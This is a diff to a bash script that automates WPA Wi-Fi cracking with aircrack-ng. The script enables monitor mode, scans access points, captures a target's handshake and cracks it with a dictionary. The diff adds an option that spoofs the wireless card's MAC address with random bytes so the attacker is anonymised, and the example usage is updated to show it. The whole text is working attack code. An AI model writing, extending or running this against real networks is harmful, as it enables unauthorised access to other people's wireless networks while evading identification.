@@ -20,13 +20,14 @@ EOF
 
 cat << EOF | column -s\& -t
 -d|--dict & Specificy dictionary to use when cracking WPA.
+-m|--mac & Change wireless's mac address with an anonymize mac.
 -h|--help & Display Help
 EOF
 
 cat << EOF
 
 Examples:
-sudo ./$(basename $0) --dict wordlist.txt
+sudo ./$(basename $0) --dict wordlist.txt --mac
 EOF
 }
 
@@ -37,6 +38,10 @@ program_exist(){
     fi
     if [ ! `which aircrack-ng` ];then
         echo "Program aircrack-ng not found,you need to install aircrack-ng"
+        exit 1
+    fi
+    if [ ! `which ifconfig` ];then
+        echo "Program ifconfig not found,you need to install net-tools"
         exit 1
     fi
 }
@@ -68,16 +73,23 @@ stop_monitor_mode(){
     iwconfig ${1} 2>/dev/null | grep -q 'Mode:Monitor'
     if [ $? -eq 0 ];then
         airmon-ng stop ${1} &>/dev/null
-        echo 'Stop Wireless interface Monitor mode: '${1}
+        echo ""
+        echo "Stop Wireless interface Monitor mode: "${1}
+        echo ""
     fi
 }
 
 start_monitor_mode(){
-    iwconfig ${1} 2>/dev/null | grep -q 'Mode:Managed'
-    if [ $? -eq 0 ];then
-        airmon-ng start ${1} &>/dev/null
-        echo 'Start Wireless interface Monitor mode: '${1}
+    if [ ${mac_change} ];then
+        iface_current_mac=$(printf ${iface_origin_mac::8}:%02X:%02X:%02X \
+        $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] | tr [A-Z] [a-z])
+        ifconfig ${1} down && ifconfig ${1} hw ether ${iface_current_mac}
+        if [ $? -eq 0 ];then
+            echo -en "Change ${1}'s MAC from ${iface_origin_mac} to ${iface_current_mac}..."
+        fi
+        ifconfig ${1} up && echo 'done'
     fi
+    airmon-ng start ${1} &>/dev/null && echo 'Start Wireless interface Monitor mode: '${1}
 }
 
 get_ap_info(){
@@ -135,7 +147,6 @@ handshake_check(){
     if [ $? -eq 0 ];then
         handshake_sig=0
         kill -15 ${airodump_pid[0]}
-        echo ""
         stop_monitor_mode ${iface}
         apbssid=$(echo ${ap_bssid} | tr ":" "-")
         cap_time=$(date '+%M%S')
@@ -144,7 +155,7 @@ handshake_check(){
         if [ -x ${CURRENT_DIR}/cap2hccapx.bin ];then
             ${CURRENT_DIR}/cap2hccapx.bin ${cap_file}.cap ${cap_file}.hccapx &>/dev/null
         fi
-        echo -e "\nSuccess!saved as ${cap_file}.cap"
+        echo -e "Success!saved as ${cap_file}.cap"
         if [ ! -z ${dict_file} ];then
             aircrack-ng -a 2 -w ${dict_file} -l ${temp_dir}/wpakey.txt \
             -b ${ap_bssid} ${cap_file}.cap
@@ -179,15 +190,15 @@ initialization(){
 
 scan_interface(){
     get_iface
-    iface_mac=$(iwconfig ${iface} | grep -oE ${mac_pattern})
-    [ -n ${iface_mac} ] && start_monitor_mode ${iface}
+    iface_origin_mac=$(ifconfig ${iface} | grep -oE ${mac_pattern})
+    [ -n ${iface_origin_mac} ] && start_monitor_mode ${iface}
     sleep 1
     iface=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
     airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite ${iface}
 }
 
 wpa_attack(){
-    trap "airmon-ng stop ${iface} &>/dev/null && exit 0" SIGINT
+    trap "stop_monitor_mode ${iface} && exit 0" SIGINT
     while true;do
         read -p 'Please select target BSSID to Crack: ' ap_bssid
         echo ${ap_bssid} | grep -oqE ^${mac_pattern}$ && break
@@ -220,6 +231,8 @@ while true;do
             exit 0
         fi
         shift;;
+        -m|--mac)
+        mac_change=0;;
         -h|--help)
         usage
         exit 0;;
